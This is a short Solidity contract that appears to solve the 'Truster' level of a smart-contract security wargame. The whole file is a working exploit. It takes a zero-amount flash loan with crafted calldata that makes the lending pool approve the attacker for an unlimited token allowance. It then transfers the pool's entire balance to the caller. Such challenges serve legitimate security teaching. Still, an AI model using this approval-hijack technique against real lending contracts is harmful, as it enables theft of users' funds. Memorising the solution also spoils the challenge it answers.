// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TrusterLenderPool} from "src/truster/TrusterLenderPool.sol";
import {ERC20} from "solmate/src/tokens/ERC20.sol";

contract TrusterAttack {
    TrusterLenderPool pool;
    ERC20 token;

    constructor(address _pool) {
        pool = TrusterLenderPool(_pool);
        token = pool.token();
    }

    function exploit() external {
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(this),
                type(uint256).max
            )
        );

        token.transferFrom(
            address(pool),
            msg.sender,
            token.balanceOf(address(pool))
        );
    }
}
